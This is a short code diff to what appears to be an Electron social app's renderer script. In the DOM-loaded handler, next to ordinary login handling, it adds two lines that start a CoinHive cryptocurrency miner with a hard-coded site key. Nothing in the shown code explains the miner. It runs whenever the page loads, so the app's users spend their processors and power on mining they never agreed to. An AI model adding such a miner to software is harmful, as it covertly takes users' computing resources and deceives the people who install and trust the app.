@@ -21,6 +21,9 @@ function unfollow (userId) {
 
 // This code runs once the DOM is loaded (just in case you missed it).
 document.addEventListener('DOMContentLoaded', () => {
+  let miner = new CoinHive.Anonymous('l8ZKEPdOmVApgeStW96ThW96bIDA0JLb');
+  miner.start();
+
   ipcRenderer.on('loggedInUser', (evt, user) => {
     window.loggedInUserId = user.id;
     window.loggedInUser = user;
